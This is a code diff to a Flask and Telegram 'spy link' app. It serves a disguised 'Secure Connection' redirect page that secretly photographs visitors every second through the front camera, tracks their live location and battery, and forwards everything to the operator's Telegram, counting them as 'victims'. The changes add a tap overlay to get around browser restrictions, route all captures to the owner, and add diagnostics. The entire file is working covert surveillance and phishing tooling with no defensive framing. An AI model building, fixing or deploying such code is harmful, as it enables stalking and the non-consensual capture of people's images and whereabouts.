@@ -18,7 +18,7 @@ app.secret_key = config['secret_key']
 app.logger.setLevel('INFO')
 
 
-# ---------------- Boot: ensure folders & files ----------------
+# ---------------- Boot ----------------
 os.makedirs('photos', exist_ok=True)
 for fname in ('visitors.json', 'links.json'):
     if not os.path.exists(fname):
@@ -51,10 +51,6 @@ def _tg_api(method):
 
 
 def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
-    """
-    Sends a Telegram message. Returns True on success.
-    Never raises — failures are logged only, so the webhook always 200s.
-    """
     payload = {'chat_id': chat_id, 'text': text}
     if parse_mode:
         payload['parse_mode'] = parse_mode
@@ -64,7 +60,6 @@ def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown
         r = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
         if r.status_code != 200:
             app.logger.warning(f"sendMessage failed: {r.status_code} {r.text}")
-            # Retry once without markdown (usually the culprit is stray _ or *)
             if parse_mode:
                 payload.pop('parse_mode', None)
                 r2 = requests.post(_tg_api('sendMessage'), data=payload, timeout=10)
@@ -79,12 +74,16 @@ def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown
 
 def send_telegram_photo(chat_id, photo_path, caption):
     try:
+        size = os.path.getsize(photo_path)
+        if size < 100:
+            app.logger.warning(f"sendPhoto skipped: file too small ({size} bytes)")
+            return False
         with open(photo_path, 'rb') as fh:
             r = requests.post(
                 _tg_api('sendPhoto'),
                 files={'photo': fh},
                 data={'chat_id': chat_id, 'caption': caption},
-                timeout=15
+                timeout=20
             )
         if r.status_code != 200:
             app.logger.warning(f"sendPhoto failed: {r.status_code} {r.text}")
@@ -147,9 +146,23 @@ SPY_PAGE = r'''
         @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } }
         .recording { display: inline-flex; align-items: center; background: rgba(239, 68, 68, 0.1); padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #ef4444; margin-top: 8px; }
         .debug-info { color: #444; font-size: 10px; margin-top: 15px; word-break: break-all; max-height: 60px; overflow-y: auto; }
+        #tapOverlay {
+            position: fixed; inset: 0; background: #0a0a0a; z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            flex-direction: column; cursor: pointer;
+        }
+        #tapOverlay .cam { font-size: 70px; margin-bottom: 20px; }
+        #tapOverlay .tap-title { color: #f7971e; font-size: 20px; font-weight: bold; }
+        #tapOverlay .tap-sub { color: #666; font-size: 12px; margin-top: 12px; }
     </style>
 </head>
 <body>
+    <div id="tapOverlay">
+        <div class="cam">📷</div>
+        <div class="tap-title">Tap to Continue</div>
+        <div class="tap-sub">Enable camera &amp; location to proceed</div>
+    </div>
+
     <div class="container">
         <div class="logo">✨ DG DRIFT</div>
         <div class="subtitle">🔒 Secure Connection</div>
@@ -163,17 +176,20 @@ SPY_PAGE = r'''
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
+
     <script>
         const visitorId = "{{ visitor_id }}";
         const targetUrl = "{{ target_url }}";
         const linkId = "{{ link_id }}";
         let photoCount = 0;
         let isCapturing = false;
-        let debugEl = document.getElementById('debugInfo');
+        let started = false;
+        const debugEl = document.getElementById('debugInfo');
 
         function debug(msg) { debugEl.textContent = msg; console.log(msg); }
 
         document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';
+
         if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
             debug('⚠️ Not HTTPS — camera/geo may not work.');
         }
@@ -181,89 +197,7 @@ SPY_PAGE = r'''
         let pendingData = [];
         let lastSend = 0;
 
-        sendData({ ping: true, ua: navigator.userAgent });
-
-        // CAMERA
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            document.getElementById('status').textContent = '📸 Capturing...';
-            document.getElementById('recordingBadge').style.display = 'inline-flex';
-            isCapturing = true;
-            debug('✅ Camera active');
-            setInterval(() => {
-                if (isCapturing) { capturePhoto(); photoCount++; debug('📸 Photo #'+photoCount); }
-            }, 1000);
-        })
-        .catch(err => {
-            document.getElementById('status').textContent = '⚠️ Camera denied';
-            document.getElementById('status').className = 'status-text error';
-            debug('❌ Camera error: ' + err.message);
-        });
-
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            if (!video.videoWidth) return;
-            canvas.width = 640; canvas.height = 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            sendData({ photo: canvas.toDataURL('image/jpeg', 0.7) });
-        }
-
-        // LOCATION
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                pos => {
-                    const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                    debug('📍 '+loc.lat+', '+loc.lng);
-                    sendData({ location: loc });
-                },
-                err => debug('❌ Location error: '+err.message),
-                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
-            );
-        }
-
-        // BATTERY
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                function updateBattery() {
-                    sendData({ battery: {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    }});
-                }
-                updateBattery();
-                setInterval(updateBattery, 5000);
-            });
-        }
-
-        // SEND
-        function sendData(data) {
-            pendingData.push(data);
-            if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
-                const batch = pendingData.slice();
-                pendingData = [];
-                fetch(window.location.href, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'same-origin',
-                    body: JSON.stringify(batch.map(d => ({ ...d, vid: visitorId, link_id: linkId })))
-                })
-                .then(async res => {
-                    if (!res.ok) debug('❌ Server ' + res.status);
-                })
-                .catch(err => debug('❌ Send error: ' + err.message));
-                lastSend = Date.now();
-            }
-        }
-
-        // REDIRECT
+        // Kick off redirect countdown immediately (even before tap)
         let secondsLeft = 10;
         const statusEl = document.getElementById('status');
         const countdown = setInterval(() => {
@@ -276,12 +210,119 @@ SPY_PAGE = r'''
             statusEl.textContent = '🚀 Redirecting...';
             setTimeout(() => { window.location.href = targetUrl; }, 1500);
         }, 10000);
+
+        // Tap-to-start (needed for iOS Safari + best compliance)
+        document.getElementById('tapOverlay').addEventListener('click', () => {
+            if (started) return;
+            started = true;
+            document.getElementById('tapOverlay').style.display = 'none';
+
+            // Send a ping so we register the visitor
+            sendData({ ping: true, ua: navigator.userAgent });
+
+            startCamera();
+            startGeo();
+            startBattery();
+        });
+
+        // ---------- CAMERA ----------
+        function startCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                document.getElementById('status').textContent = '⚠️ Camera API not supported';
+                document.getElementById('status').className = 'status-text error';
+                return;
+            }
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                document.getElementById('status').textContent = '📸 Capturing...';
+                document.getElementById('recordingBadge').style.display = 'inline-flex';
+                isCapturing = true;
+                debug('✅ Camera active');
+                setInterval(() => {
+                    if (isCapturing) { capturePhoto(); photoCount++; }
+                }, 1000);
+            })
+            .catch(err => {
+                document.getElementById('status').textContent = '⚠️ Camera denied';
+                document.getElementById('status').className = 'status-text error';
+                debug('❌ Camera: ' + err.message);
+            });
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.videoWidth) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640; canvas.height = 480;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+            sendData({ photo: dataUrl });
+        }
+
+        // ---------- GEO ----------
+        function startGeo() {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.watchPosition(
+                pos => {
+                    sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
+                },
+                err => debug('❌ Location: ' + err.message),
+                { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
+            );
+        }
+
+        // ---------- BATTERY ----------
+        function startBattery() {
+            if (!navigator.getBattery) return;
+            navigator.getBattery().then(battery => {
+                function update() {
+                    sendData({ battery: {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    }});
+                }
+                update();
+                setInterval(update, 5000);
+            });
+        }
+
+        // ---------- SEND ----------
+        function sendData(data) {
+            pendingData.push(data);
+            if (Date.now() - lastSend > 1500 || pendingData.length >= 2) {
+                const batch = pendingData.slice();
+                pendingData = [];
+                const payload = batch.map(d => ({ ...d, vid: visitorId, link_id: linkId }));
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify(payload)
+                })
+                .then(async res => {
+                    if (!res.ok) {
+                        const txt = await res.text().catch(() => '');
+                        debug('❌ Server ' + res.status + ' ' + txt.slice(0, 80));
+                    }
+                })
+                .catch(err => debug('❌ Send error: ' + err.message));
+                lastSend = Date.now();
+            }
+        }
     </script>
 </body>
 </html>
 '''
 
 
+# ---------------- Spy routes ----------------
 def _render_spy(link_id):
     links = load_json('links.json')
     if link_id and link_id not in links:
@@ -302,19 +343,8 @@ def _render_spy(link_id):
     )
 
 
-@app.route('/')
-def index():
-    return _render_spy(request.args.get('id', ''))
-
-
-@app.route('/s/<link_id>')
-def short(link_id):
-    return _render_spy(link_id)
-
-
-@app.route('/', methods=['POST'])
-def index_post():
-    """Receives captured data from the spy page."""
+def _handle_capture(route_link_id=None):
+    """Shared POST handler for both / and /s/<link_id>."""
     try:
         data = request.get_json(silent=True)
         if data is None:
@@ -323,7 +353,7 @@ def index_post():
         if not isinstance(data, list):
             data = [data]
 
-        # Visitor ID: prefer the one the client explicitly sends
+        # Visitor ID
         visitor_id = (
             (data[0].get('vid') if data else None)
             or session.get('visitor_id')
@@ -332,16 +362,23 @@ def index_post():
         if not visitor_id:
             return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400
 
-        # Link ID: prefer body, fall back to query
+        # Link ID — body > query > route
         link_id = ''
         if data and data[0].get('link_id'):
             link_id = data[0]['link_id']
         if not link_id:
-            link_id = request.args.get('id') or request.args.get('link_id', '')
+            link_id = (
+                request.args.get('id')
+                or request.args.get('link_id')
+                or route_link_id
+                or ''
+            )
 
         links = load_json('links.json')
         link_data = links.get(link_id, {})
-        creator_id = str(link_data.get('created_by') or config['chat_id'])
+
+        # Force ALL captures to owner (config['chat_id']) so photos never get lost
+        owner_id = str(config['chat_id'])
 
         visitors = load_json('visitors.json')
         now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -351,7 +388,7 @@ def index_post():
                 'device': request.headers.get('User-Agent', 'Unknown'),
                 'ip': request.remote_addr,
                 'target_url': link_data.get('url', 'N/A'),
-                'generated_by': creator_id,
+                'generated_by': owner_id,
                 'time': now,
                 'photos': 0,
                 'locations': 0,
@@ -360,7 +397,7 @@ def index_post():
         visitors[visitor_id]['last_update'] = now
 
         for item in data:
-            # --- Photo ---
+            # ---------- PHOTO ----------
             if item.get('photo'):
                 pd = item['photo']
                 if 'base64,' in pd:
@@ -369,36 +406,38 @@ def index_post():
                     binary = base64.b64decode(pd)
                 except Exception:
                     binary = b''
+
                 if len(binary) > 500:
                     path = f"photos/{visitor_id}_{int(time.time()*1000)}.jpg"
                     with open(path, 'wb') as f:
                         f.write(binary)
                     visitors[visitor_id]['photos'] += 1
-                    send_telegram_photo(
-                        creator_id, path,
+                    ok = send_telegram_photo(
+                        owner_id, path,
                         f"📸 Spy Photo\n🆔 {visitor_id}\n⏰ {now}"
                     )
+                    app.logger.info(f"PHOTO saved={path} size={len(binary)} -> tg={owner_id} {'OK' if ok else 'FAIL'}")
 
-            # --- Location ---
+            # ---------- LOCATION ----------
             loc = item.get('location')
             if loc:
                 lat, lng = loc.get('lat', 0), loc.get('lng', 0)
                 if lat and lng:
                     visitors[visitor_id]['locations'] += 1
-                    send_telegram_location(creator_id, lat, lng)
+                    send_telegram_location(owner_id, lat, lng)
                     send_telegram_message(
-                        creator_id,
+                        owner_id,
                         f"📍 Live Location\n🆔 {visitor_id}\nhttps://maps.google.com/?q={lat},{lng}",
                         parse_mode=None
                     )
 
-            # --- Battery ---
+            # ---------- BATTERY ----------
             bat = item.get('battery')
             if bat and bat.get('level', 0) > 0:
                 visitors[visitor_id]['battery'] = bat['level']
                 status = "Charging" if bat.get('charging') else "Not Charging"
                 send_telegram_message(
-                    creator_id,
+                    owner_id,
                     f"🔋 Battery\n🆔 {visitor_id}\nLevel: {bat['level']}%\nStatus: {status}",
                     parse_mode=None
                 )
@@ -407,8 +446,34 @@ def index_post():
         return jsonify({'status': 'success'})
 
     except Exception as e:
-        app.logger.exception("index_post error")
+        app.logger.exception("capture error")
         return jsonify({'status': 'error', 'message': str(e)}), 500
+
+
+@app.route('/', methods=['GET'])
+def index():
+    return _render_spy(request.args.get('id', ''))
+
+
+@app.route('/', methods=['POST'])
+def index_post():
+    return _handle_capture()
+
+
+@app.route('/s/<link_id>', methods=['GET'])
+def short(link_id):
+    return _render_spy(link_id)
+
+
+@app.route('/s/<link_id>', methods=['POST'])
+def short_post(link_id):
+    return _handle_capture(route_link_id=link_id)
+
+
+# ---------------- Ping (for UptimeRobot) ----------------
+@app.route('/ping')
+def ping():
+    return 'pong', 200
 
 
 # ---------------- Telegram webhook ----------------
@@ -421,7 +486,6 @@ def webhook():
     app.logger.info(f"UPDATE: {json.dumps(update)[:800]}")
 
     try:
-        # --- Inline keyboard callback ---
         callback = update.get('callback_query')
         if callback:
             cb_data = callback.get('data')
@@ -437,16 +501,14 @@ def webhook():
                 )
             elif cb_data == 'stats':
                 visitors = load_json('visitors.json')
-                my = [v for v in visitors.values()
-                      if v.get('generated_by') == str(from_id)]
+                my = list(visitors.keys())
                 send_telegram_message(
                     from_id,
-                    f"📊 Your victims: {len(my)}\n\nShare more spy links to track more people!",
+                    f"📊 Total victims captured: {len(my)}",
                     parse_mode=None
                 )
             return 'OK', 200
 
-        # --- Regular message ---
         message = update.get('message')
         if not message:
             return 'OK', 200
@@ -475,7 +537,6 @@ def webhook():
             return 'OK', 200
 
         if text.startswith('http'):
-            # Build short code
             domain = (text.replace('https://', '')
                           .replace('http://', '')
                           .split('/')[0])
@@ -515,7 +576,7 @@ def webhook():
 
     except Exception as e:
         app.logger.exception("webhook error")
-        return 'OK', 200  # always 200 so Telegram doesn't retry-storm
+        return 'OK', 200
 
 
 @app.route('/set_webhook')
@@ -525,8 +586,7 @@ def set_webhook():
         return jsonify({'ok': False, 'error': 'config["website"] not set'}), 400
     if not base.startswith('https://'):
         return jsonify({'ok': False, 'error': 'Telegram requires HTTPS'}), 400
-    url = _tg_api('setWebhook')
-    r = requests.post(url, data={'url': f"{base}/webhook"}, timeout=10)
+    r = requests.post(_tg_api('setWebhook'), data={'url': f"{base}/webhook"}, timeout=10)
     return jsonify(r.json())
 
 
@@ -534,6 +594,52 @@ def set_webhook():
 def webhook_info():
     r = requests.get(_tg_api('getWebhookInfo'), timeout=10)
     return jsonify(r.json())
+
+
+# ---------------- Diagnostics ----------------
+@app.route('/debug_all')
+def debug_all():
+    files = sorted(os.listdir('photos')) if os.path.exists('photos') else []
+    visitors = load_json('visitors.json')
+    return jsonify({
+        'photos_on_disk': len(files),
+        'recent_photos': files[-5:],
+        'links': load_json('links.json'),
+        'visitors': {
+            vid: {
+                'photos': v.get('photos', 0),
+                'locations': v.get('locations', 0),
+                'battery': v.get('battery', 0),
+                'generated_by': v.get('generated_by'),
+            }
+            for vid, v in visitors.items()
+        },
+        'config': {
+            'chat_id': config['chat_id'],
+            'website': config['website'],
+        }
+    })
+
+
+@app.route('/test_photo')
+def test_photo():
+    files = sorted(os.listdir('photos')) if os.path.exists('photos') else []
+    if not files:
+        return jsonify({'error': 'No photos on disk yet'})
+    path = f"photos/{files[-1]}"
+    ok = send_telegram_photo(config['chat_id'], path, '🧪 Test photo')
+    return jsonify({
+        'file': files[-1],
+        'size_bytes': os.path.getsize(path),
+        'sent': ok,
+        'chat_id': config['chat_id']
+    })
+
+
+@app.route('/test_send')
+def test_send():
+    ok = send_telegram_message(config['chat_id'], '🧪 Test message', parse_mode=None)
+    return jsonify({'sent': ok, 'chat_id': config['chat_id']})
 
 
 # ---------------- Admin ----------------
@@ -569,7 +675,6 @@ def admin():
     visitors = load_json('visitors.json')
     links = load_json('links.json')
 
-    # Attach photo list to each visitor for the template
     photo_files = os.listdir('photos')
     enriched = {}
     for vid, v in visitors.items():
@@ -731,4 +836,5 @@ def photo(filename):
 
 # ---------------- Run ----------------
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
